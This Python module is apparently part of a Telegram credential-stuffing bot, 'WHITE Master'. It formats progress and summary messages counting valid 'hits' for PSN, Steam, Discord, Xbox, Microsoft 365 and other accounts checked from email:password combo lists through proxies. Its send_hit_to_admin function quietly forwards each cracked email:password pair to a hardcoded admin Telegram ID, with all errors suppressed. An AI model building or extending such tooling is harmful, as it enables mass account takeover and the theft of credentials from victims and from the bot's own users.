import time
from HOME.helpers import (
    bold, italic, mono, pre, make_progress_bar,
    E_ROCKET, E_GEAR, E_CHART, E_FIRE, E_BOLT, E_CLOCK, E_GAME, E_MUSIC,
    E_CAMERA, E_KEY, E_GIFT, E_MONEY, E_STAR, E_DIAMOND, E_RED, E_YELLOW,
    E_ORANGE, E_PURPLE, E_GREEN, E_STOP, E_CHECK, E_PARTY, E_USER, E_PIN,
    E_BOOM, E_CROSS, E_MEMO, E_WARN
)


# ═══ PREMIUM UI THEME ═══
def _hdr(title: str) -> str:
    return f"<blockquote>╭─────────────────────╮\n      {title}\n╰─────────────────────╯</blockquote>"


def _pbar(done: int, total: int, length: int = 12) -> str:
    pct = min(done / total, 1.0) if total else 0
    filled = int(length * pct)
    return "▰" * filled + "▱" * (length - filled) + f" {int(pct * 100)}%"


_SEP = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"


def build_status_message(cs):
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    eta_s = ((st.valid - st.checked) / (st.checked / elapsed)) if st.checked > 0 and elapsed > 0 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    eta_str = time.strftime("%H:%M:%S", time.gmtime(eta_s)) if eta_s > 0 else "--:--:--"
    total_hits = len(st.all_hits)

    return f"""{_hdr('⚡ 𝗪𝗛𝗜𝗧𝗘 𝗠𝗔𝗦𝗧𝗘𝗥 ⚡')}

<blockquote>
{E_CHART} <b>PROGRESS</b>
{_pbar(st.checked, st.valid)}
<code>{st.checked}</code>/<code>{st.valid}</code>  •  {E_BOLT} <code>{cpm}</code> cpm
{E_CLOCK} <code>{el_str}</code>  •  ETA <code>{eta_str}</code>
{_SEP}
{E_FIRE} <b>HITS: <code>{total_hits}</code></b>
{_SEP}
{E_GAME} PSN <code>{st.psn}</code>  •  Steam <code>{st.steam}</code>
{E_GAME} Supercell <code>{st.supercell}</code>  •  TikTok <code>{st.tiktok}</code>
{E_CAMERA} Insta <code>{st.instagram}</code>  •  MC <code>{st.minecraft}</code>
{E_KEY} XCodes <code>{st.xbox_codes}</code>  •  Pulled <code>{st.xbox_pulled}</code> (V:<code>{st.xbox_pulled_valid}</code>)
{E_GIFT} Discord <code>{st.discord_valid}/{st.discord_total}</code> (C:<code>{st.discord_claimed}</code> U:<code>{st.discord_unk}</code>)
{E_MONEY} Balance <code>{st.balance}</code>  •  RP <code>{st.rp_hits}</code> (<code>{st.rp_total_pts}</code> pts)
{E_DIAMOND} XGPU <code>{st.xgpu}</code> • XGPP <code>{st.xgpp}</code> • XGPE <code>{st.xgpe}</code> • M365 <code>{st.m365}</code>
{_SEP}
{E_RED} Bad <code>{st.bad}</code>  •  2FA <code>{st.twofa}</code>
{E_YELLOW} Err <code>{st.errors}</code>  •  Retry <code>{st.retries}</code>  •  PxErr <code>{st.proxy_err}</code>
</blockquote>
{E_GEAR} {italic('WHITE Master • Dev: @ADI_WT')}"""


def build_summary_message(cs, stopped=False):
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    total_hits = len(st.all_hits)
    status_text = f"{E_STOP} Stopped" if stopped else f"{E_CHECK} Completed"

    return f"""{_hdr('🏁 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘')}

<blockquote>
<b>Status:</b> {status_text}
{_SEP}
{E_CHART} Lines <code>{st.total}</code>  •  Valid <code>{st.valid}</code>
⏭ Skipped <code>{st.bad_lines}</code>  •  Checked <code>{st.checked}</code>
{E_BOLT} CPM <code>{cpm}</code>  •  {E_CLOCK} <code>{el_str}</code>
{_SEP}
{E_FIRE} <b>TOTAL HITS: <code>{total_hits}</code></b>
{_SEP}
{E_GAME} PSN <code>{st.psn}</code> • Steam <code>{st.steam}</code> • Supercell <code>{st.supercell}</code>
{E_MUSIC} TikTok <code>{st.tiktok}</code> • {E_CAMERA} Insta <code>{st.instagram}</code> • MC <code>{st.minecraft}</code>
{E_KEY} XCodes <code>{st.xbox_codes}</code> • Pulled <code>{st.xbox_pulled}</code> (V:<code>{st.xbox_pulled_valid}</code>)
{E_GIFT} Discord <code>{st.discord_valid}/{st.discord_total}</code> (C:<code>{st.discord_claimed}</code>)
{E_MONEY} Balance <code>{st.balance}</code> • RP <code>{st.rp_hits}</code> (<code>{st.rp_total_pts}</code> pts)
{E_DIAMOND} XGPU <code>{st.xgpu}</code> • XGPP <code>{st.xgpp}</code> • XGPE <code>{st.xgpe}</code>
{E_DIAMOND} M365 <code>{st.m365}</code> • Other <code>{st.other_svc}</code>
{_SEP}
{E_RED} Bad <code>{st.bad}</code> • 2FA <code>{st.twofa}</code> • Err <code>{st.errors}</code> • PxErr <code>{st.proxy_err}</code>
</blockquote>
{E_GEAR} {italic('WHITE Master • Dev: @ADI_WT')}"""


def send_hit_to_admin(email, pwd, cat, det, user):
    from HOME import state
    from HOME.helpers import user_full_link
    try:
        msg = f"""{_hdr('🔥 𝗡𝗘𝗪 𝗛𝗜𝗧')}
<blockquote>
{E_KEY} <b>Type:</b> <code>{cat}</code>
{E_USER} <b>Combo:</b> <code>{email}:{pwd}</code>
{E_STAR} <b>Details:</b> <code>{det}</code>
{E_USER} <b>By:</b> {user_full_link(user)}
</blockquote>
{E_GEAR} {italic('Dev: @ADI_WT')}"""
        from CONFIG.config import ADMIN_ID
        state.bot.send_message(ADMIN_ID, msg, parse_mode="HTML", disable_web_page_preview=True)
    except:
        pass
